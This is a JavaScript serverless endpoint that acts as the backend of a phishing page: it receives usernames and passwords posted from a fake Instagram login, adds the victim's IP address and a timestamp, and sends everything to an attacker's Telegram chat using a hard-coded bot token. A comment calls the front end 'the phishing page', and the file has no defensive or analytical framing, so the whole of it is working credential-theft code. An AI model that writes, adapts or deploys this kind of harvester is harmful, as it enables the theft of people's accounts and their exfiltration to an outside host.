// api/collect.js
module.exports = async (req, res) => {
  // Only allow POST requests
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  // Get the credentials from the request body
  const { username, password } = req.body;

  // YOUR CREDENTIALS - REPLACE THESE!
  const BOT_TOKEN = '7789640105:AAFYmswVPWOzqmKBAmDCcUwvJVrI_6L040U';
  const CHAT_ID = '6254229187';

  // Format the message for Telegram
  const message = `🔓 *New Instagram Credentials Captured* 🔓\n\n*Username:* ${username}\n*Password:* ||${password}||\n\n*IP:* ${req.headers['x-forwarded-for'] || req.connection.remoteAddress}\n*Time:* ${new Date().toISOString()}`;

  try {
    // Send the message to your Telegram bot
    const telegramResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'MarkdownV2',
        disable_web_page_preview: true,
      }),
    });

    const telegramData = await telegramResponse.json();

    if (telegramData.ok) {
      // Send a success response back to the phishing page
      res.status(200).json({ success: true });
    } else {
      console.error('Telegram API error:', telegramData);
      res.status(500).json({ success: false, error: 'Failed to send to Telegram' });
    }
  } catch (error) {
    console.error('Server error:', error);
    res.status(500).json({ success: false, error: 'Internal server error' });
  }
};
